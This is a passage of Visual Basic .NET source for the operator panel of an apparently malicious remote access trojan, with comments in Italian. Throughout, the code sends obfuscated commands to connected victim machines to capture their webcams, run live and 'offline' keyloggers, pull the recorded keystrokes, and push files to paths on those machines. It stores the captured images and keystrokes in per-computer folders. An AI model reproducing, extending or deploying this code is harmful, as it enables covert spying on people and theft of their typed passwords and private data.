                Dlg2.Title = "Select a file.."
                Dlg2.ShowDialog()
                If Not Dlg2.FileName = "" Then
                    lstwUpL.Items.Add(System.IO.Path.GetFileName(Dlg2.FileName), 7)
                    lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Add(Dlg2.FileName)
                    lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Add(Math.Round(FileLen(Dlg2.FileName) / 1024))
                    Dlg2.FileName = ""
                End If
                Dlg2.FileName = ""
            Else
                MsgBox("You have to select a correct path!", MsgBoxStyle.Information)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmsStartUp_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmsStartUp.Click
        If Me.picUp.BackColor = Color.Green Then
            If Not lstwUpL.Items.Count <= 0 Then
                If Not txtPath.Text = "" Then
                    Try
                        'lblBytesUp.Text = "0 kb"
                        FileClose(lblClid.Text + 6)
                        DirToUp = txtPath.Text

                        FileToUp = lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Text
                        cmsStartUp.Enabled = False
                        If Dir(lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text) <> "" Then
                            Try
                                netstreamup.Write(
                                           UTF8.GetBytes(DirToUp & "\" & lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Text & "|^Ca/çz£u^|" & FileLen(lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text)), 0, UTF8.GetBytes(
                                               DirToUp & "\" & lstwUpL.Items.Item(lstwUpL.Items.Count - 1).Text & "|^Ca/çz£u^|" & FileLen(lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text)).Length) 'invio il comando il Client
                                lblStatUp.Text = "In uploading"
                            Catch ex As Exception
                                ISCONNup = False
                            End Try
                        Else
                            MsgBox("The file " & lstwUpL.Items.Item(lstwUpL.Items.Count - 1).SubItems.Item(1).Text & vbCrLf & "does not exist", MsgBoxStyle.Information)
                        End If
                    Catch ex As Exception
                        ISCONNup = False
                    End Try
                Else
                    MsgBox("You have to select a correct path where the client will save the uploaded file", MsgBoxStyle.Information)
                End If
            Else
                MsgBox("The file list is empty", MsgBoxStyle.Information)
            End If
        Else
            MsgBox("The upload socket is listening or is not connected!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub RemoveFileFromTheListToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveFileFromTheListToolStripMenuItem.Click
        Try
            If Not lstwUpL.SelectedItems.Count <= 0 Then

                If cmsStartUp.Enabled = False Then
                    If Not lstwUpL.SelectedItems.Item(0).Index = lstwUpL.Items.Count - 1 Then
                        lstwUpL.SelectedItems.Item(0).Remove()
                    Else
                        MsgBox("This file is currently in uploading", MsgBoxStyle.Information)
                    End If
                Else
                    lstwUpL.SelectedItems.Item(0).Remove()
                End If

            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub lstwUpL_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lstwUpL.MouseUp
        Try
            If e.Button = Windows.Forms.MouseButtons.Right Then

                cxmstrUp.Show(Me.lstwUpL, New Point(e.X, e.Y))

            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub


    Private Sub chkAvvFFUp_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles chkAvvFFUp.Click
        If chkAvvFFUp.Checked = True Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(">(||u"), 0, UTF8.GetBytes(">(||u").Length) 'invio il comando il Client
            Catch ex As Exception
                ISPC = False
            End Try
        Else
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(">Not>u"), 0, UTF8.GetBytes(">Not>u").Length) 'invio il comando il Client
            Catch ex As Exception
                ISPC = False
            End Try
        End If
    End Sub

    Private Sub tmrPannWeb_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPannWeb.Tick
        If listenerweb.Pending Then
            clientweb = listenerweb.AcceptTcpClient()
            netstreamweb = clientweb.GetStream()
            ISCONNweb = True
            tmrPannWeb.Stop()
            tmrDatiweb.Start()
        End If
    End Sub

    Private Sub StartListeningToolStripMenuItem2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartListeningToolStripMenuItem2.Click
        If Not picweb.BackColor = Color.Green Then
            Try
                listenerweb = New TcpListener(IPAddress.Any, nudW.Value)
                listenerweb.Start()
                tmrPannWeb.Start()
                picWeb.BackColor = Color.Yellow


                Try
                    frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("}>W°eb>{"), 0, UTF8.GetBytes("}>W°eb>{").Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPC = False
                End Try

            Catch ex As Exception
                MsgBox("Maybe a listener is currently started, close or restart it to run an other socket or a control panel", MsgBoxStyle.Information)
            End Try
        Else

            MsgBox("The webcam socket is listening or is already connected", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub CloseConnectionToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseConnectionToolStripMenuItem3.Click
        FileClose(Me.lblClid.Text + 8)
        cmdOpImmW.Enabled = True

        If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
            FPAN3(Me.lblClid.Text - 1).Close()
        End If

        prgDatiWeb.Value = 0
        prgDatiWeb.Maximum = 100
        lblkbWeb.Text = "0 kb"
        cmdOpImmW.Enabled = True

        If Not clientweb Is Nothing Then
            clientweb.Close()
        End If

        If Not listenerweb Is Nothing Then
            listenerweb.Stop()
        End If
        tmrDatiweb.Enabled = False
        tmrPannWeb.Enabled = False
        picWeb.BackColor = Color.Red
        ISCONNweb = False
        Try
            frmMain.netstream(
                         Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes(">M|Wa°|°"), 0, UTF8.GetBytes(">M|Wa°|°").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub


    Private Sub picWeb_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picWeb.MouseClick
        Try
            cxmstrWeb.Show(picWeb, New Point(e.X, e.Y))
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdGTW_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGTW.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("{D!c!s"), 0, UTF8.GetBytes("{D!c!s").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdOpImmW_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdOpImmW.Click
        If picWeb.BackColor = Color.Green Then
            If Not combDri.SelectedIndex < 0 Then
                Try
                    frmMain.netstream(
                        Me.lblClid.Text - 1).Write(
                        UTF8.GetBytes("ST||ARTCAP" & combDri.SelectedIndex), 0, UTF8.GetBytes("ST||ARTCAP" & combDri.SelectedIndex).Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPC = False
                End Try

                FPAN3(Me.lblClid.Text - 1) = New frmImmWeb

                FPAN3(Me.lblClid.Text - 1).Text = Me.lblClid.Text & " webcam viewer - " & Split(Me.Text, " - ")(1)
                FPAN3(Me.lblClid.Text - 1).Show()
                cmdOpImmW.Enabled = False
            Else
                MsgBox("Please select a device", MsgBoxStyle.Information)
            End If
        Else
            MsgBox("The webcam server is not connected or is listening", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub tmrDatiWeb_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiWeb.Tick
        If ISCONNweb = True Then
            If clientweb.Available > 0 Then
                Dim buffer10(clientweb.Available - 1) As Byte
                netstreamweb.Read(buffer10, 0, buffer10.Length)
                Dim NumFw As Integer
                NumFw = Me.lblClid.Text + 8
                If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                    If InStr(UTF8.GetString(buffer10), "<<LookWize>>") Then
                        FileClose(NumFw)

                        Me.prgDatiWeb.Maximum = Replace(UTF8.GetString(buffer10), "<<LookWize>>", "")
                        Me.lblkbWeb.Text = Me.prgDatiWeb.Maximum \ 1024 & " kb"

                        If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
                            MkDir(Application.StartupPath & "\Computers")
                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                                End If

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                                End If
                            End If
                        Else
                            If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text) = True Then
                                MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text)

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                                End If

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                                End If
                            Else

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot")
                                End If

                                If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads") = True Then
                                    MkDir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\Downloads")
                                End If
                            End If
                        End If
                        If Dir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".bmp") <> "" Then
                            Kill(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".bmp")
                        End If
                        FileOpen(NumFw, Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".bmp", OpenMode.Binary)
                        Try
                            netstreamweb.Write(
                                UTF8.GetBytes("{Ok}"), 0, UTF8.GetBytes(
                                    "{Ok}").Length) 'invio il comando il Client
                        Catch ex As Exception
                            FPAN3(Me.lblClid.Text - 1).LoopWeb = False
                            Me.ISCONNweb = False
                        End Try

                    Else
                        Try
                            FilePut(NumFw, buffer10) '12
                        Catch ex As Exception
                            FileClose(NumFw)
                            FPAN3(Me.lblClid.Text - 1).Close()
                        End Try
                        If Not Me.prgDatiWeb.Value + buffer10.Length > Me.prgDatiWeb.Maximum Then
                            Me.prgDatiWeb.Value = Me.prgDatiWeb.Value + buffer10.Length 'FileLen(Application.StartupPath & "\S.jpg")
                        End If
                        If Me.prgDatiWeb.Value = Me.prgDatiWeb.Maximum Then
                            Me.prgDatiWeb.Value = 0
                            FileClose(NumFw)
                            If Dir(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".bmp") <> "" Then
                                Try
                                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Load(Application.StartupPath & "\Computers\N" & Me.lblClid.Text & "\ScreenShot" & "\" & Me.lblClid.Text - 1 & ".bmp")
                                Catch ex As Exception
                                End Try
                            End If
                            If chkImmSizeW.Checked = True Then
                                If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Visible = False
                                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Visible = False
                                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Dock = DockStyle.Fill
                                    FPAN3(Me.lblClid.Text - 1).pal1w.Dock = DockStyle.Fill
                                    FPAN3(Me.lblClid.Text - 1).MaximizeBox = True
                                    FPAN3(Me.lblClid.Text - 1).FormBorderStyle = Windows.Forms.FormBorderStyle.Sizable
                                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.SizeMode = PictureBoxSizeMode.StretchImage
                                End If

                            Else

                                If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Dock = DockStyle.Right
                                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Dock = DockStyle.Bottom
                                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Dock = DockStyle.None
                                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Maximum = FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Height
                                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Maximum = FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Width
                                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Visible = True
                                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Visible = True
                                    FPAN3(Me.lblClid.Text - 1).MaximizeBox = False
                                    FPAN3(Me.lblClid.Text - 1).FormBorderStyle = Windows.Forms.FormBorderStyle.FixedSingle
                                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.SizeMode = PictureBoxSizeMode.AutoSize
                                End If
                            End If
                            If FPAN3(Me.lblClid.Text - 1).LoopWeb = True Then
                                Try
                                    If Me.picWeb.BackColor = Color.Red Then
                                        MsgBox("The webcam client is not connected!", MsgBoxStyle.Exclamation)
                                    End If
                                    netstreamweb.Write(UTF8.GetBytes("<Wake>"), 0, UTF8.GetBytes("<Wake>").Length) 'invio il comando il Client
                                Catch ex As Exception
                                    FPAN3(Me.lblClid.Text - 1).LoopWeb = False
                                    Me.ISCONNweb = False
                                End Try
                            End If
                        End If

                    End If
                End If
            End If
        Else
            FileClose(Me.lblClid.Text + 8)
            lblkbWeb.Text = "0 kb"
            Me.prgDatiWeb.Value = 0
            If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                FPAN3(Me.lblClid.Text - 1).LoopWeb = False
                FPAN3(Me.lblClid.Text - 1).Close()
            End If
            clientweb.Close()
            tmrDatiWeb.Enabled = False
            tmrPannWeb.Enabled = False
            picWeb.BackColor = Color.Red
            MsgBox("The webcam server was not connected!", MsgBoxStyle.Exclamation)
        End If
    End Sub


    Private Sub chkImmSizeW_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles chkImmSizeW.Click
        Try
            If chkImmSizeW.Checked = True Then
                If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Visible = False
                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Visible = False
                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Dock = DockStyle.Fill
                    FPAN3(Me.lblClid.Text - 1).pal1w.Dock = DockStyle.Fill
                    FPAN3(Me.lblClid.Text - 1).MaximizeBox = True
                    FPAN3(Me.lblClid.Text - 1).FormBorderStyle = Windows.Forms.FormBorderStyle.Sizable
                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.SizeMode = PictureBoxSizeMode.StretchImage
                End If

            Else

                If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Dock = DockStyle.Right
                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Dock = DockStyle.Bottom
                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Dock = DockStyle.None
                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Maximum = FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Height
                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Maximum = FPAN3(Me.lblClid.Text - 1).picBoxWebcam.Width
                    FPAN3(Me.lblClid.Text - 1).VScrollBarW.Visible = True
                    FPAN3(Me.lblClid.Text - 1).HScrollBarw.Visible = True
                    FPAN3(Me.lblClid.Text - 1).MaximizeBox = False
                    FPAN3(Me.lblClid.Text - 1).FormBorderStyle = Windows.Forms.FormBorderStyle.FixedSingle
                    FPAN3(Me.lblClid.Text - 1).picBoxWebcam.SizeMode = PictureBoxSizeMode.AutoSize
                End If
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdSetW_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSetW.Click
        Try
            If Not FPAN3(Me.lblClid.Text - 1) Is Nothing Then
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("S'|'eW" & FPAN3(Me.lblClid.Text - 1).Width & " , " & FPAN3(Me.lblClid.Text - 1).Height), 0, UTF8.GetBytes("S'|'eW" & FPAN3(Me.lblClid.Text - 1).Width & " , " & FPAN3(Me.lblClid.Text - 1).Height).Length) 'invio il comando il Client
            Else
                MsgBox("You need to open the image receiver to set it", MsgBoxStyle.Information)
            End If
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdSetPerW_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSetPerW.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("|O%|h" & nudQW.Value), 0, UTF8.GetBytes("|O%|h" & nudQW.Value).Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdRIMMW_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdRIMMW.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("r|W|r"), 0, UTF8.GetBytes("r|W|r").Length) 'invio il comando il Client
            nudQW.Value = 100
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub tmrPannKey_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrPannKey.Tick
        If listenerkey.Pending Then
            clientkey = listenerkey.AcceptTcpClient()
            netstreamkey = clientkey.GetStream()
            tmrPannKey.Stop()
            ISPCkey = True
            tmrDatiKey.Start()
        End If
    End Sub

    Private Sub CloseConnectionToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseConnectionToolStripMenuItem4.Click

        lblStppK.Text = "STOPPED"
        txtKey.Text = ""
        LoopK = False
        If Not clientkey Is Nothing Then
            clientkey.Close()
        End If

        If Not listenerkey Is Nothing Then
            listenerkey.Stop()
        End If
        tmrDatiKey.Enabled = False
        tmrPannKey.Enabled = False
        picKey.BackColor = Color.Red
        ISPCkey = False
        Try
            frmMain.netstream(
            Me.lblClid.Text - 1).Write(
            UTF8.GetBytes("K.{}K"), 0, UTF8.GetBytes("K.{}K").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub StartListeningToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartListeningToolStripMenuItem3.Click
        If Not picKey.BackColor = Color.Green Then
            Try

                txtKey.Text = ""
                LoopK = False
                listenerkey = New TcpListener(IPAddress.Any, NudK.Value)
                listenerkey.Start()
                tmrPannKey.Start()
                picKey.BackColor = Color.Yellow


                Try
                    frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes("KiaKi||"), 0, UTF8.GetBytes("KiaKi||").Length) 'invio il comando il Client
                Catch ex As Exception
                    ISPC = False
                End Try

            Catch ex As Exception
                MsgBox("Maybe a listener is currently started, close or restart it to run an other socket or a control panel", MsgBoxStyle.Information)
            End Try
        Else

            MsgBox("The keylogger socket is listening or is already connected", MsgBoxStyle.Information)
        End If
    End Sub



    Private Sub picKey_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picKey.MouseClick
        Try
            cxmstrKey.Show(picKey, New Point(e.X, e.Y))
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cdSTARTOnK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cdSTARTOnK.Click
        If picKey.BackColor = Color.Green Then

            Try
                LoopK = True
                netstreamkey.Write(UTF8.GetBytes("S/ta°K"), 0, UTF8.GetBytes("S/ta°K").Length) 'invio il comando il Client
            Catch ex As Exception
                ISPCkey = False
                LoopK = False
            End Try

        Else
            MsgBox("The keylogger server is listening or is not connected!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub tmrDatiKey_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiKey.Tick
        If ISPCkey = True Then
            If clientkey.Available > 0 Then
                Dim buffer11(clientkey.Available - 1) As Byte
                netstreamkey.Read(buffer11, 0, buffer11.Length)


                If LoopK = True Then

                    If InStr(UTF8.GetString(buffer11), "§\°KK") Then

                        txtacK.Text = Replace(Split(UTF8.GetString(buffer11), "<{']>")(0), Microsoft.VisualBasic.Left(UTF8.GetString(buffer11), Len("§\°KK")), "")

                        txtKey.Text = Split(UTF8.GetString(buffer11), "<{']>")(1)


                        Try
                            netstreamkey.Write(UTF8.GetBytes("S/ta°K"), 0, UTF8.GetBytes("S/ta°K").Length) 'invio il comando il Client
                        Catch ex As Exception
                            ISPCkey = False
                            LoopK = False
                        End Try
                    End If
                Else

                    If InStr(UTF8.GetString(buffer11), "UnK|") = False Then

                        If InStr(UTF8.GetString(buffer11), "§\°KK") = False Then
                            lblStppK.Text = "RECEIVING KEYS.."

                            My.Computer.FileSystem.WriteAllBytes(Environ("TEMP") & "\KeyR.txt", buffer11, False)

                            Dim fileReadermat As System.IO.StreamReader
                            fileReadermat = _
                            My.Computer.FileSystem.OpenTextFileReader(Environ("TEMP") & "\KeyR.txt")
                            Dim Letturamat As String
                            Letturamat = fileReadermat.ReadToEnd
                            fileReadermat.Close()
                            txtKey.Text = txtKey.Text & Letturamat
                            lblStppK.Text = "STOPPED"
                            cdSTARTOnK.Enabled = True
                        End If

                    End If

                    If InStr(UTF8.GetString(buffer11), "UnK|") Then
                        txtKey.Text = ""
                        lblStppK.Text = "STOPPED"
                        cdSTARTOnK.Enabled = True
                        MsgBox("Unable to read keys", MsgBoxStyle.Exclamation)
                    End If


                End If


                
                End If

        Else

            lblStppK.Text = "STOPPED"
            clientkey.Close()
            tmrDatiKey.Enabled = False
            tmrPannKey.Enabled = False
            picKey.BackColor = Color.Red
            LoopK = False
            cdSTARTOnK.Enabled = True
            txtKey.Text = ""
            MsgBox("The keylogger server was not connected!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdStopK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdStopK.Click
        If picKey.BackColor = Color.Green Then


            txtKey.Text = ""
            Try
                netstreamkey.Write(UTF8.GetBytes("STO|K"), 0, UTF8.GetBytes("STO|K").Length) 'invio il comando il Client
            Catch ex As Exception
                ISPCkey = False
            End Try
            If frmMain.IfCosoKA(Me.lblClid.Text - 1) = True Then
                frmMain.IfCosoKA(Me.lblClid.Text - 1) = False
                MsgBox("The offiline keylogger has been disactivated", MsgBoxStyle.Information)
            End If
            txtKey.Text = ""
            LoopK = False
        Else
            MsgBox("The keylogger server is listening or is not connected!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub cmdSaveKs_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSaveKs.Click
        Try
            If Not txtKey.Text = "" Then
                If Not Directory.Exists(Application.StartupPath & "\Computers") = True Then
                    MkDir(Application.StartupPath & "\Computers")
                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text) = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text)

                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\ScreenShot") = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\ScreenShot")
                        End If

                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Downloads") = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Downloads")
                        End If
                    End If
                Else
                    If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text) = True Then
                        MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text)

                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\ScreenShot") = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\ScreenShot")
                        End If

                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Downloads") = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Downloads")
                        End If
                    Else

                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\ScreenShot") = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\ScreenShot")
                        End If

                        If Not Directory.Exists(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Downloads") = True Then
                            MkDir(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Downloads")
                        End If
                    End If
                End If

                Try
                    Dim wr2 As StreamWriter
                    wr2 = New StreamWriter(Application.StartupPath & "\Computers\N" & Me.lblCl.Text & "\Notes.txt", False)
                    wr2.Write(txtKey.Text)
                    wr2.Flush()
                    wr2.Close()

                    MsgBox("The text has been saved successfully in the special folder", MsgBoxStyle.Information)
                Catch ex As Exception
                    MsgBox("Error in saving the registered keys", MsgBoxStyle.Information)
                End Try
            Else
                MsgBox("The textbox is empty", MsgBoxStyle.Information)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdInstallK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdInstallK.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("O|tAt{Of"), 0, UTF8.GetBytes("O|tAt{Of").Length) 'invio il comando il Client
            frmMain.IfCosoKA(Me.lblClid.Text - 1) = True
            MsgBox("The offline keylogger has been installed successfully", MsgBoxStyle.Information)
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdGetK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGetK.Click
        If LoopK = True Then
            MsgBox("Please disactive the online keylogger!", MsgBoxStyle.Exclamation)
        Else
            If picKey.BackColor = Color.Green Then
                Try
                    txtKey.Text = ""
                    netstreamkey.Write(UTF8.GetBytes("O|f°Of"), 0, UTF8.GetBytes("O|f°Of").Length) 'invio il comando il Client
                    lblStppK.Text = "RECEIVING KEYS.."
                    cdSTARTOnK.Enabled = False
                Catch ex As Exception
                    ISPCkey = False
                    LoopK = False
                End Try
            Else
                MsgBox("The keylogger server is listening or is not connected!", MsgBoxStyle.Information)
            End If
        End If
    End Sub

    Private Sub cmdOpenC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdOpenC.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes(txtName.Text & "|!" & txtRName.Text & ">_H_A"), 0, UTF8.GetBytes(txtName.Text & "|!" & txtRName.Text & ">_H_A").Length) 'invio il comando il Client
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdCloseC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdCloseC.Click
        Try
            frmMain.netstream(
                Me.lblClid.Text - 1).Write(
                UTF8.GetBytes("^__Cl^"), 0, UTF8.GetBytes("^__Cl^").Length) 'invio il comando il Client
            txtChatB.Text = ""
            txtChatBox.Text = ""
        Catch ex As Exception
            ISPC = False
        End Try
    End Sub

    Private Sub cmdSendC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSendC.Click
        If Not txtChatB.Text = "" Then
            Try
                frmMain.netstream(
                    Me.lblClid.Text - 1).Write(
                    UTF8.GetBytes(txtChatB.Text & "_<\/"), 0, UTF8.GetBytes(txtChatB.Text & "_<\/").Length) 'invio il comando il Client
                txtChatBox.Text = txtChatBox.Text & txtName.Text & ": " & txtChatB.Text & vbCrLf
                txtChatB.Text = ""
            Catch ex As Exception
                ISPC = False
            End Try
        End If
    End Sub

    Private Sub lstwClipboard_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles lstwClipboard.DoubleClick
        Try
            If lstwClipboard.SelectedItems.Count > 0 Then
                txtVisNoLis.Text = lstwClipboard.SelectedItems(0).Text
                txtVisNoLis.Visible = True
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub


    Private Sub lstwClipboard_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles lstwClipboard.MouseUp
        Try
            If e.Button = Windows.Forms.MouseButtons.Right Then
                cxmstrClip.Show(lstwClipboard, New Point(e.X, e.Y))
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

